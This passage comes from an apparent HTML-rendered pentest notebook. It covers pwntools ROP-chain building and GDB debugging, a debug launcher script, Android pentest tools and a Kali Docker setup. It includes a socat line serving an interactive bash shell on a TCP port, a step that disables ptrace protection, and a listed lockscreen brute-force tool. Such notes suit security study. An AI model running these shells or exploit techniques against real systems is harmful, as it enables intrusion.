# 00000020  aa 75 1b bb  00 00 00 00  73 5f 00 aa  00 00 00 00  │·u··│····│s_··│····│
# 00000030  00 00 00 00  00 00 00 00  24 58 00 aa  00 00 00 00  │····│····│$X··│····│
# 00000040
</code></pre>
<h2 id="rop-chain"><a class="header" href="#rop-chain">ROP chain</a></h2>
<p><code>rop.chain</code> command generate a chain that use gadgets available into the ELF binary.</p>
<p>Example:</p>
<p>[Shell python]</p>
<pre><code class="language-shell">&gt;&gt;&gt; elf = ELF('./jean_pile')

&gt;&gt;&gt; rop = ROP(elf)

&gt;&gt;&gt; rop.gadgets
{4195907: Gadget(0x400643, ['add esp, 8', 'ret'], [], 0x10),
 4195906: Gadget(0x400642, ['add rsp, 8', 'ret'], [], 0x10),
 4197002: Gadget(0x400a8a, ['leave', 'ret'], ['rbp', 'rsp'], 0x2540be407),
 4197244: Gadget(0x400b7c, ['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['r12', 'r13', 'r14', 'r15'], 0x28),
 4197246: Gadget(0x400b7e, ['pop r13', 'pop r14', 'pop r15', 'ret'], ['r13', 'r14', 'r15'], 0x20),
 4197248: Gadget(0x400b80, ['pop r14', 'pop r15', 'ret'], ['r14', 'r15'], 0x18),
 4197250: Gadget(0x400b82, ['pop r15', 'ret'], ['r15'], 0x10),
 4197243: Gadget(0x400b7b, ['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r12', 'r13', 'r14', 'r15'], 0x30),
 4197247: Gadget(0x400b7f, ['pop rbp', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r14', 'r15'], 0x20),
 4196168: Gadget(0x400748, ['pop rbp', 'ret'], ['rbp'], 0x10),
 4197251: Gadget(0x400b83, ['pop rdi', 'ret'], ['rdi'], 0x10),
 4197249: Gadget(0x400b81, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18),
 4197245: Gadget(0x400b7d, ['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rsp', 'r13', 'r14', 'r15'], 0x28),
 4195910: Gadget(0x400646, ['ret'], [], 0x8)}

 &gt;&gt;&gt; rop.puts(elf.got['puts'])

&gt;&gt;&gt; hex(elf.got['puts'])
'0x602018'

&gt;&gt;&gt; print(hexdump(bytes(rop)))
00000000  83 0b 40 00  00 00 00 00  18 20 60 00  00 00 00 00  │··@·│····│· `·│····│
00000010  60 06 40 00  00 00 00 00                            │`·@·│····│
00000018

&gt;&gt;&gt; print(rop.dump())
0x0000:         0x400b83 pop rdi; ret
0x0008:         0x602018 [arg0] rdi = got.puts
0x0010:         0x400660 puts

&gt;&gt;&gt; rop.chain()
b'\x83\x0b@\x00\x00\x00\x00\x00\x18 `\x00\x00\x00\x00\x00`\x06@\x00\x00\x00\x00\x00'

&gt;&gt;&gt; ','.join([hex(i) for i in rop.chain()])
'0x83,0xb,0x40,0x0, 0x0,0x0,0x0,0x0, 0x18,0x20,0x60,0x0, 0x0,0x0,0x0,0x0, 0x60,0x6,0x40,0x0 ,0x0,0x0,0x0,0x0'
# 64bits little endian
# 0x00000000 0x00400b83
# 0x00000000 0x00602018
# 0x00000000 0x00400660
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="table-of-contents-2"><a class="header" href="#table-of-contents-2">Table of Contents</a></h1>
<ul>
<li><a href="pentest/pwntools/debugging/index.html#prerequisites">Prerequisites</a></li>
<li><a href="pentest/pwntools/debugging/index.html#launching-a-process-under-gdb">Launching a Process Under GDB</a></li>
<li><a href="pentest/pwntools/debugging/index.html#attaching-to-a-running-process">Attaching to a Running Process</a>
<ul>
<li><a href="pentest/pwntools/debugging/index.html#local-processes">Local Processes</a></li>
<li><a href="pentest/pwntools/debugging/index.html#forking-servers">Forking Servers</a></li>
</ul>
</li>
<li><a href="pentest/pwntools/debugging/index.html#debugging-foreign-architectures">Debugging Foreign Architectures</a></li>
<li><a href="pentest/pwntools/debugging/index.html#troubleshooting">Troubleshooting</a>
<ul>
<li><a href="pentest/pwntools/debugging/index.html#behind-the-scenes">Behind the Scenes</a></li>
<li><a href="pentest/pwntools/debugging/index.html#specifying-a-terminal-window">Specifying a Terminal Window</a></li>
<li><a href="pentest/pwntools/debugging/index.html#environment-variables">Environment Variables</a></li>
<li><a href="pentest/pwntools/debugging/index.html#unable-to-attach-to-processes">Unable to Attach to Processes</a></li>
<li><a href="pentest/pwntools/debugging/index.html#argv0-and-argc==0">argv0 and argc==0</a></li>
</ul>
</li>
</ul>
<p>Pwntools has rich support for using a debugger in your exploit workflow, and debuggers
are very useful when developing exploits when issues with exploits arise.</p>
<p>In addition to the resources here for debugging, you may want to enhance your GDB
experience with one of the following projects:</p>
<ul>
<li><a href="https://pwndbg.re">Pwndbg</a></li>
<li><a href="https://github.com/hugsy/gef">GDB Enhanced Features (GEF)</a></li>
</ul>
<h1 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h1>
<p>You should have both <code>gdb</code> and <code>gdbserver</code> installed on your machine.
You can check this easily with <code>which gdb</code> or <code>which gdbserver</code>.</p>
<p>If you find that you don't have them installed, they can easily be installed from
most package managers.</p>
<pre><code class="language-sh">$ sudo apt-get install gdb gdbserver
</code></pre>
<h1 id="launching-a-process-under-gdb"><a class="header" href="#launching-a-process-under-gdb">Launching a Process Under GDB</a></h1>
<p>Launching a process under GDB while still being able to interact with that process
from pwntools is a tricky process, but luckily it's all been sorted out and the 
process is pretty seamless.</p>
<p>To launch a process under GDB from the very first instruction, just use 
<a href="https://docs.pwntools.com/en/stable/gdb.html#pwnlib.gdb.debug">gdb.debug</a>.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(&quot;/bin/bash&quot;, gdbscript='continue')
&gt;&gt;&gt; io.sendline('echo hello')
&gt;&gt;&gt; io.recvline()
# b'hello\n'
&gt;&gt;&gt; io.interactive()
</code></pre>
<p>This should automatically launch the debugger in a new window for you to interact
with.  If it does not, or you see an error about <code>context.terminal</code>, check out the
section on <a href="pentest/pwntools/debugging/index.html#specifying-a-terminal-window">Specifying a Terminal Window</a>.</p>
<p>In this example, we passed in <code>gdbscript='continue'</code> in order for the debugger
to resume execution, but you can pass in any valid GDB script commands and they
will be executed when the debugged process starts.</p>
<h1 id="attaching-to-a-running-process"><a class="header" href="#attaching-to-a-running-process">Attaching to a Running Process</a></h1>
<p>Sometimes you don't want to start your target under a debugger, but want to attach
to it at a certain stage in the exploitation process.<br />
This is also handled seamlessly by Pwntools.</p>
<h2 id="local-processes"><a class="header" href="#local-processes">Local Processes</a></h2>
<p>Generally, you will have created a <code>process()</code> tube in order to interact with the
target executable.  You can simply pass that to <code>gdb.attach()</code> and it will magically
open a new terminal window with the target binary under the debugger.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = process('/bin/sh')
&gt;&gt;&gt; gdb.attach(io, gdbscript='continue')
</code></pre>
<p>A new window should appear, and you can continue to interact with the process
as you normally would from Pwntools.</p>
<h2 id="forking-servers"><a class="header" href="#forking-servers">Forking Servers</a></h2>
<p>Sometimes the binary you want to debug has a forking server, and you want to
debug the process you are connected to (rather than the server itself).  This
is also done seamlessly, as long as the server is running on the current machine.</p>
<p>Let's fake a server with socat!</p>
<pre><code class="language-py">&gt;&gt;&gt; socat = process(['socat', 'TCP-LISTEN:4141,reuseaddr,fork', 'EXEC:/bin/bash -i'])
</code></pre>
<p>Then we connect to the remote process with a <code>remote</code> tube as usual.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = remote('localhost', 4141)
[x] Opening connection to localhost on port 4141
[x] Opening connection to localhost on port 4141: Trying 127.0.0.1
[+] Opening connection to localhost on port 4141: Done
&gt;&gt;&gt; io.sendline('echo hello')
&gt;&gt;&gt; io.recvline()
b'hello\n'
&gt;&gt;&gt; io.lport, io.rport
</code></pre>
<p>It works!  In order to debug the specific <code>bash</code> process our <code>remote</code> object, just
pass it to <code>gdb.attach()</code>.  Pwntools will look up the PID of the remote end of the 
connection and attempt to connect to it automatically.</p>
<pre><code class="language-py">&gt;&gt;&gt; gdb.attach(io)
</code></pre>
<p>A debugger should appear automatically, and you can interact with the process.</p>
<!-- TODO: This is currently broken, see https://github.com/Gallopsled/pwntools/issues/1589 -->
<h1 id="debugging-foreign-architectures"><a class="header" href="#debugging-foreign-architectures">Debugging Foreign Architectures</a></h1>
<p>Debugging foreign architectures (like ARM or PowerPC) from an Intel-based system is
as easy as running them under pwntools.</p>
<pre><code class="language-py">&gt;&gt;&gt; context.arch = 'arm'
&gt;&gt;&gt; elf = ELF.from_assembly(shellcraft.echo(&quot;Hello, world!\n&quot;) + shellcraft.exit())
&gt;&gt;&gt; process(elf.path).recvall()
b'Hello, world!\n'
</code></pre>
<p>Instead of invoking <code>process(...)</code> just use <code>gdb.debug(...)</code>.</p>
<pre><code class="language-py">&gt;&gt;&gt; gdb.debug(elf.path).recvall()
b'Hello, world!\n'
</code></pre>
<h2 id="tips-and-limitations"><a class="header" href="#tips-and-limitations">Tips and Limitations</a></h2>
<p>Processes running foreign architectures MUST be started with <code>gdb.debug</code> in order
to debug them, it is not possible to attach to a running process due to the way
that QEMU works.</p>
<p>It should be noted that QEMU has a very limited GDB stub, which is used to
inform GDB where various libraries are, so debugging may be more difficult,
and some commands will not work.</p>
<p>Pwntools recommends Pwndbg to handle this situation, since it has code specifically
to handle debugging under a QEMU stub.</p>
<!-- TODO: There is no tutorial for interacting with cross-arch binaries -->
<h1 id="troubleshooting"><a class="header" href="#troubleshooting">Troubleshooting</a></h1>
<h2 id="behind-the-scenes"><a class="header" href="#behind-the-scenes">Behind the Scenes</a></h2>
<p>Sometimes things just don't work, and you need to see what is happening internal
to Pwntools with the debugger setup.</p>
<p>You can set the logging context globally (via e.g. <code>context.log_level='debug'</code>)
or you can set it ONLY for the GDB session, via passing in the same argument.</p>
<p>You should see everything that's being handled for you behind the scenes.
For example:</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug('/bin/sh', log_level='debug')
[x] Starting local process '/home/user/bin/gdbserver' argv=[b'/home/user/bin/gdbserver', b'--multi', b'--no-disable-randomization', b'localhost:0', b'/bin/sh']
[+] Starting local process '/home/user/bin/gdbserver' argv=[b'/home/user/bin/gdbserver', b'--multi', b'--no-disable-randomization', b'localhost:0', b'/bin/sh'] : pid 34282
[DEBUG] Received 0x25 bytes:
    b'Process /bin/sh created; pid = 34286\n'
[DEBUG] Received 0x18 bytes:
    b'Listening on port 45145\n'
[DEBUG] Wrote gdb script to '/tmp/user/pwnxcd1zbyx.gdb'
    target remote 127.0.0.1:45145
[*] running in new terminal: /usr/bin/gdb -q  &quot;/bin/sh&quot; -x /tmp/user/pwnxcd1zbyx.gdb
[DEBUG] Launching a new terminal: ['/usr/local/bin/tmux', 'splitw', '/usr/bin/gdb -q  &quot;/bin/sh&quot; -x /tmp/user/pwnxcd1zbyx.gdb']
[DEBUG] Received 0x25 bytes:
    b'Remote debugging from host 127.0.0.1\n'
</code></pre>
<h2 id="specifying-a-terminal-window"><a class="header" href="#specifying-a-terminal-window">Specifying a Terminal Window</a></h2>
<p>Pwntools [attempts to launch a new window][run_in_new_terminal] to container your 
debugger based on whatever windowing system you are currently using.</p>
<p>By default, it auto-detects:</p>
<ul>
<li>tmux or screen</li>
<li>X11-based terminals like GNOME Terminal</li>
</ul>
<p>If you are not using a supported terminal environment, or it does not work in the
way you want (e.g. horizontal vs vertical splits) you can add support by setting
the <code>context.terminal</code> environment variable.</p>
<p>For example, the following will use TMUX to split horizontally instead of the default.</p>
<pre><code class="language-py">&gt;&gt;&gt; context.terminal = ['tmux', 'splitw', '-h']
</code></pre>
<p>Maybe you're a GNOME Terminal user and the default settings aren't working?</p>
<pre><code class="language-py">&gt;&gt;&gt; context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
</code></pre>
<p>You can specify any terminal you like, and can even put the setting inside
<code>~/.pwn.conf</code> so that it's used for all of you scripts!</p>
<pre><code>[context]
terminal=['x-terminal-emulator', '-e']
</code></pre>
<h2 id="environment-variables"><a class="header" href="#environment-variables">Environment Variables</a></h2>
<p>Pwntools allows you to specify any environment variables you like via <code>process()</code>,
and the same is true for <code>gdb.debug()</code>.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(['bash', '-c', 'echo $HELLO'], env={'HELLO': 'WORLD'})
&gt;&gt;&gt; io.recvline()
b'WORLD\n'
</code></pre>
<h3 id="cwd-and"><a class="header" href="#cwd-and"><code>CWD</code> and <code>   </code></a></h3>
<p>Unfortunately, when using <code>gdb.debug()</code>, the process is launched under <code>gdbserver</code>
which adds its own environment variables.  This may introduce complications when
the environment must be very carefully controlled.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(['env'], env={'FOO':'BAR'}, gdbscript='continue')
&gt;&gt;&gt; print(io.recvallS())
   =/home/user/bin/gdbserver
FOO=BAR

Child exited with status 0
GDBserver exiting
</code></pre>
<p>This only occurs when you launch the process under a debugger with <code>gdb.debug()</code>.
If you're able to start your process and <em>then</em> attach with <code>gdb.attach()</code>, you
can avoid this issue.</p>
<h3 id="environment-variable-ordering"><a class="header" href="#environment-variable-ordering">Environment Variable Ordering</a></h3>
<p>Some exploits may require that certain environment variables are in a specific
order.  Python2 dictionaries are not ordered, which may exacerbate this issue.</p>
<p>In order to have your environment variables in a specific order, we recommend
using Python3 (which orders dictionaries based on insertion order), or using
<code>collections.OrderedDict</code>.</p>
<h2 id="unable-to-attach-to-processes"><a class="header" href="#unable-to-attach-to-processes">Unable to Attach to Processes</a></h2>
<p>Modern Linux systems have a setting called <code>ptrace_scope</code> which prevents processes
that are not child processes from being debugged.  Pwntools works around this
for any processes that it launches itself, but if you have to launch a process
outside of Pwntools and try to attach to it by pid (e.g. <code>gdb.attach(1234)</code>),
you may be prevented from attaching.</p>
<p>You can resolve this by disabling the security setting and rebooting your machine:</p>
<pre><code class="language-sh">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF
kernel.yama.ptrace_scope = 0
EOF
</code></pre>
<h2 id="argv0-and-argc0"><a class="header" href="#argv0-and-argc0">argv0 and argc==0</a></h2>
<p>Some challenges require that they are launched with <code>argv[0]</code> set to a specific
value, or even that it's NULL (i.e. <code>argc==0</code>).</p>
<p>It is not possible to launch a processs with this configuration via <code>gdb.debug()</code>,
but you can use <code>gdb.attach()</code>.  This is because of limitations of launching
binaries under gdbserver.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="some-useful-script"><a class="header" href="#some-useful-script">Some useful script</a></h1>
<div style="break-before: page; page-break-before: always;"></div><pre><code class="language-python">#!/usr/bin/env python3
from pwn import *
import click
from enum import Enum

# For tmux console type
# context.terminal = ['tmux', 'splitw', '-h']
        

class InteractiveType(Enum):
    &quot;&quot;&quot;Enum interactive type.&quot;&quot;&quot;
    NoInteractive = 0
    Shell = 1
    PythonShell = 3

class ArchType(Enum):
    &quot;&quot;&quot;Enum Architecture type.&quot;&quot;&quot;
    aarch64 = 0,
    arm = 1,
    i386 = 2,
    amd64 = 3

class OsType(Enum):
    &quot;&quot;&quot;Enum OS type.&quot;&quot;&quot;
    linux = 1,
    windows = 2

class EndianType(Enum):
    &quot;&quot;&quot;Enum Endian type.&quot;&quot;&quot;
    big = 1, 
    little = 2

class LogLevel(Enum):
    &quot;&quot;&quot;Enum log level type.&quot;&quot;&quot;
    debug = 1,
    info = 2,
    warn = 3,
    error = 4

class EnumType(click.Choice):
    &quot;&quot;&quot;Helper to ;ap Enum &lt;=&gt; click.Choice.&quot;&quot;&quot;

    def __init__(self, enum):
        self.__enum = enum
        super().__init__(enum.__members__)

    def convert(self, value, param, ctx):
        return self.__enum[super().convert(value, param, ctx)]

@click.group()
def cli():
    pass

@cli.command()
@click.argument(
    &quot;target&quot;,
    type=click.Path(exists=True, file_okay=True, dir_okay=False),
    metavar=&quot;TARGET&quot;,
)
@click.option(
    &quot;-i&quot;,
    &quot;--interactive_type&quot;,
    type=EnumType(InteractiveType),
    default=InteractiveType.Shell.name,
    show_default=True,
    help=&quot;Select interactive type&quot;,
)
@click.option(
    &quot;-a&quot;,
    &quot;--arch&quot;,
    type=EnumType(ArchType),
    default=ArchType.amd64.name,
    show_default=True,
    help=&quot;Select interactive type&quot;,
)
@click.option(
    &quot;-o&quot;,
    &quot;--os&quot;,
    type=EnumType(OsType),
    default=OsType.linux.name,
    show_default=True,
    help=&quot;Select Os type&quot;,
)
@click.option(
    &quot;-e&quot;,
    &quot;--endian&quot;,
    type=EnumType(EndianType),
    default=EndianType.little.name,
    show_default=True,
    help=&quot;Select Endian type&quot;,
)
@click.option(
    &quot;-l&quot;,
    &quot;--log_level&quot;,
    type=EnumType(LogLevel),
    default=LogLevel.info.name,
    show_default=True,
    help=&quot;Select Log Level type&quot;,
)
@click.option(
    &quot;-b&quot;,
    &quot;--bits&quot;,
    type=click.Choice(['32', '64']),
    default='64',
    show_default=True,
    help=&quot;Select bits type&quot;,
)
def start(target: str, interactive_type: InteractiveType, arch:ArchType, os:OsType, endian:EndianType, log_level: LogLevel, bits: str):    
    &quot;&quot;&quot;Start debugging script.&quot;&quot;&quot;
    print(f&quot;arch.name =&gt; {arch.name}&quot;)
    print(f&quot;os.name =&gt; {os.name}&quot;)
    print(f&quot;endian.name =&gt; {endian.name}&quot;)
    print(f&quot;log_level.name =&gt; {log_level.name}&quot;)
    print(f&quot;int(bits) =&gt; {int(bits)}&quot;)

    # Define target context
    context.update(arch=arch.name, os=os.name, endian=endian.name, log_level=log_level.name, bits=int(bits))

    if interactive_type == InteractiveType.NoInteractive:
        p = process(target)
        p.wait()
    elif interactive_type == InteractiveType.Shell:
        # Break point
        addr_before_check = &quot;168f&quot;
        addr_after_check = &quot;16b7&quot;
    
        # Script
        gdb_script = f&quot;&quot;&quot;
        break *($base +0x{addr_before_check})
        break *($base +0x{addr_after_check})
        &quot;&quot;&quot;
        
        # GDB interactive debugging
        p = gdb.debug(target, aslr=False, gdbscript=gdb_script)
        p.interactive()
    elif interactive_type == InteractiveType.PythonShell:
        from IPython import embed
        p = process(target)
        embed()



if __name__ == &quot;__main__&quot;:
    cli()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="penetration-testing-application-for-android"><a class="header" href="#penetration-testing-application-for-android">Penetration Testing Application for Android</a></h1>
<p>List for Android penetration testing applications and tools that can be used to aid in penetration testing. The following are the most commonly used applications.
Feel free to suggest new applications and tools at comments section below.</p>
<h2 id="list-of-android-penetration-testing-tools-and-applications"><a class="header" href="#list-of-android-penetration-testing-tools-and-applications">List of Android Penetration Testing Tools and Applications</a></h2>
<ul>
<li><a href="https://magiskmanager.com/" title="Magisk Manager Official Website">Magisk Manager</a> - Systemless rooting system.</li>
<li><a href="https://github.com/ElderDrivers/EdXposedManager/releases" title="EdXposed Manager Github Page">EdXposed Manager</a> - Companion Android application for EdXposed.</li>
<li><a href="https://play.google.com/store/apps/details?id=stericson.busybox" title="BusyBox Play Store Page">BusyBox</a> - Android busyBox.</li>
<li><a href="https://play.google.com/store/apps/details?id=com.dundastech.sqlitemasterlight" title="SQLite Editor Play Store Page">SQLite Editor Master</a> - SQLite Editor.</li>
<li><a href="https://play.google.com/store/apps/details?id=com.speedsoftware.rootexplorer" title="Root Explorer Play Store Page">Root Explorer</a> File Manager for Root Users (Root Required).</li>
<li><a href="https://github.com/tegal1337/CiLocks" title="CiLocks Github Page">CiLocks</a> - Python script to brute force android lockscreen password.</li>
<li><a href="https://play.google.com/store/apps/details?id=net.techet.netanalyzerlite.an" title="Network Analyzer Play Store Page">Network Analyzer</a> - Network Analyzer for Android.</li>
<li><a href="https://www.apkmirror.com/apk/grey-shirts/packet-capture/packet-capture-1-4-7-release/packet-capture-1-4-7-android-apk-download/" title="Packet Capture APK Mirror">Packet Capture</a> - Packet capture/Network traffic sniffer.</li>
<li><a href="https://play.google.com/store/apps/details?id=yarolegovich.materialterminal&amp;hl=en" title="Material Terminal Play Store Page">Material Terminal</a> - Terminal for Android.</li>
<li><a href="https://github.com/matlink/gplaycli" title="Gplaycli Github Page">Gplaycli</a> Cli Tool to download APK form PlayStore.</li>
</ul>
<!-- appendices -->
<!-- end appendices -->
<p>Some Reference</p>
<ul>
<li><a href="https://securitycafe.ro/2023/04/03/mobile-pentesting-101-how-to-set-up-your-android-environment/">Mobile Pentesting 101 – How to set up your Android Environment</a></li>
<li><a href="https://securitycafe.ro/2022/02/01/root-detection-and-ssl-pinning-bypass/#1-frida">Root detection and SSL pinning bypass</a></li>
<li><a href="https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/#intro-to-keystore">Mobile Pentesting 101 – Bypassing Biometric Authentication</a></li>
<li><a href="https://github.com/fire1ce/3os.org/blob/main/docs/android">Github - fire1ce/3os.org </a></li>
<li><a href="https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet">Github - ivan-sincek/android-penetration-testing-cheat-sheet</a></li>
<li><a href="https://github.com/cryptax/androidre/tree/master">Androidre</a></li>
<li><a href="https://medium.com/innovies-club/running-android-emulator-in-a-docker-container-19ecb68e1909">Running Android Emulator in a Docker Container</a></li>
<li><a href="https://redfoxsec.com/blog/category/mobile/">RedFox Sec tutorial</a></li>
<li><a href="https://github.com/xtiankisutsa/awesome-mobile-CTF">awesome-mobile-CTF</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="red-fox-training"><a class="header" href="#red-fox-training">Red Fox TRaining</a></h1>
<p>Here is some training/tuto to Android pentest from <a href="pentest/Mobile/red_fox_sec_training/1"><code>Red Fox Sec</code> blog</a>.</p>
<ul>
<li><a href="pentest/Mobile/red_fox_sec_training/./web_view/index.html">Exploiting Android WebView Vulnerabilities</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./broad_cast_receivers/index.html">Exploiting Broadcast Receivers</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./content_providers/index.html">Exploiting Content Providers</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./drozer/index.html">Android Pentesting with Drozer</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./tapjacking/index.html">Android Tapjacking Vulnerability</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./crypto/index.html">Broken Cryptography in Android Applications</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./pentest_method/index.html">Android Pentesting Methodology (Pt. 1)</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./pentest_method/index.html">Android Pentesting Methodology (Pt. 2)</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./pentest_method/index.html">Android Pentesting Methodology (Pt. 3)</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./frida_root/index.html">Android Root Detection Bypass Using Frida</a></li>
<li><a href="pentest/Mobile/red_fox_sec_training/./frida_ssl_pinning/index.html">SSL Pinning Bypass For Android Using Frida</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exploiting-android-webview-vulnerabilities"><a class="header" href="#exploiting-android-webview-vulnerabilities">Exploiting Android WebView Vulnerabilities</a></h1>
<p>https://redfoxsec.com/blog/exploiting-android-webview-vulnerabilities/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exploiting-broadcast-receivers"><a class="header" href="#exploiting-broadcast-receivers">Exploiting Broadcast Receivers</a></h1>
<p>https://redfoxsec.com/blog/exploiting-broadcast-receivers/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exploiting-content-providers"><a class="header" href="#exploiting-content-providers">Exploiting Content Providers</a></h1>
<p>https://redfoxsec.com/blog/exploiting-content-providers/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-pentesting-with-drozer"><a class="header" href="#android-pentesting-with-drozer">Android Pentesting with Drozer</a></h1>
<p>https://redfoxsec.com/blog/android-pentesting-with-drozer/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-tapjacking-vulnerability"><a class="header" href="#android-tapjacking-vulnerability">Android Tapjacking Vulnerability</a></h1>
<p>https://redfoxsec.com/blog/android-tapjacking-vulnerability/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="broken-cryptography-in-android-applications"><a class="header" href="#broken-cryptography-in-android-applications">Broken Cryptography in Android Applications</a></h1>
<p>https://redfoxsec.com/blog/broken-cryptography-android-applications/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-pentesting-methodology"><a class="header" href="#android-pentesting-methodology">Android Pentesting Methodology</a></h1>
<ul>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-1/</li>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-2/</li>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-3/</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-pentesting-methodology-1"><a class="header" href="#android-pentesting-methodology-1">Android Pentesting Methodology</a></h1>
<ul>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-1/</li>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-2/</li>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-3/</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-pentesting-methodology-2"><a class="header" href="#android-pentesting-methodology-2">Android Pentesting Methodology</a></h1>
<ul>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-1/</li>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-2/</li>
<li>https://redfoxsec.com/blog/android-pentesting-methodology-part-3/</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="android-root-detection-bypass-using-frida"><a class="header" href="#android-root-detection-bypass-using-frida">Android Root Detection Bypass Using Frida</a></h1>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="kali-in-docker-for-pentest"><a class="header" href="#kali-in-docker-for-pentest">Kali in docker for pentest</a></h1>
<p>Mettre <code>Kali</code> en docker afin d'éviter les VMs.
Il faut un <code>docker</code> et <code>docker-compose</code>. Puis définir des alias</p>
<h2 id="docker-composeyml"><a class="header" href="#docker-composeyml">Docker-compose.yml</a></h2>
<pre><code class="language-docker-compose">version: &quot;3.3&quot;
services:
  kali:
    build: .
    image: kali_custom
    container_name: kali
    hostname: kalilinux
    environment:
      - DISPLAY=$DISPLAY
    volumes:
      - '/tmp/.X11-unix:/tmp/.X11-unix:rw'
      - '/home/user/pentest:/pentest:rw'
    network_mode: host
    stdin_open: true # docker run -i
    tty: true # docker run -t
    cap_add:
      - NET_RAW
      - NET_ADMIN
</code></pre>
<h2 id="dockerfile-1"><a class="header" href="#dockerfile-1">Dockerfile</a></h2>
<pre><code class="language-Dockerfile">FROM kalilinux/kali-rolling

RUN apt update &amp;&amp; apt upgrade -y

RUN apt install \
    # Network
    curl iputils-ping tcpdump netcat-traditional iproute2  \
    dnsutils burpsuite nmap socat whois gobuster wireshark-common \
    tshark \
    netdiscover \
    # Exploit
    metasploit-framework \
    build-essential git libdistorm3-dev yara libraw1394-11 libcapstone-dev capstone-tool tzdata \
    # python
    python3 python3-dev libpython3-dev python3-pip python3-setuptools python3-wheel \
    # Fuzzing
    afl++ \
    # Android
    apktool jadx dex2jar jd-gui\
    # Forensics
    forensics-colorize guymager ollydbg \
    exiftool file sleuthkit tree \
    # sdeep
    libfuzzy-dev libfuzzy2 ssdeep \
    # Social engineering
    maltego veil \
    # Reverse
    # hydra hydra-gtk 
    # ghidra \
    binwalk \
    # Cracking
    hashcat wordlists john john-data \
    # Utils
    zsh libssl-dev \
    # software-properties-common \
    apt-transport-https rlwrap \
    -y

RUN apt install ghidra -y

RUN apt install wget
RUN mkdir tools &amp;&amp; wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar &amp;&amp; chmod +x stegsolve.jar

RUN apt install testdisk proxychains nano -y

# Volatility
# ?pycrypto?
RUN python3 -m pip install -U distorm3 pillow openpyxl ujson pytz ipython capstone yara-python --break-system-packages
RUN python3 -m pip install -U git+https://github.com/volatilityfoundation/volatility3.git --break-system-packages

# Arsenal Pentest Orange Framework
RUN python3 -m pip install -U arsenal-cli --break-system-packages

# Cheat sh
RUN curl -s https://cht.sh/:cht.sh | tee /usr/local/bin/cht.sh &amp;&amp; chmod +x /usr/local/bin/cht.sh

# Identify anything
RUN python3 -m pip install -U pywhat --break-system-packages


# Clean up
RUN apt clean autoclean \
    &amp;&amp; apt autoremove --yes \
    &amp;&amp; rm -rf /var/lib/{apt,dpkg,cache,log}/ \
    &amp;&amp; rm -rf /var/lib/apt/lists/*
RUN echo 'export PATH=/home/username/.local/bin:$PATH' &gt;&gt; ~/.profile

WORKDIR /pentest

CMD [&quot;/bin/zsh&quot;]
</code></pre>
<h2 id="alias"><a class="header" href="#alias">Alias</a></h2>
<p>A définir dans <code>.zshrc</code></p>
<pre><code class="language-bash">...
kali () {
	if [[ $(systemctl is-active docker.service) == &quot;inactive&quot; ]]
	then
		sudo systemctl start docker
	fi
	xhost +local:docker
	pushd /media/user/Backup/kali_docker &gt; /dev/null
	docker-compose up -d --build
	popd &gt; /dev/null
	echo &quot;[+] Kali is running.&quot;
	echo &quot;[+] docker exec -it kali zsh&quot;
}

kali_shell() {
	running=$(docker container inspect -f '{{.State.Running}}' kali 2&gt;/dev/null)
	if [ &quot;$running&quot; = &quot;true&quot; ]
	then
		docker exec -it kali zsh
	else
		echo &quot;[-] kali container is not running&quot;
	fi
}
...
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="wireshark"><a class="header" href="#wireshark">Wireshark</a></h1>
<h2 id="description"><a class="header" href="#description">Description</a></h2>
<p>Wireshark is an open-source tool for capturing and analyzing network packets. This tool is primarily used to capture network traffic on a machine’s interfaces. These captures can then be saved in PCAP files (with a .pcap extension) for analysis.</p>
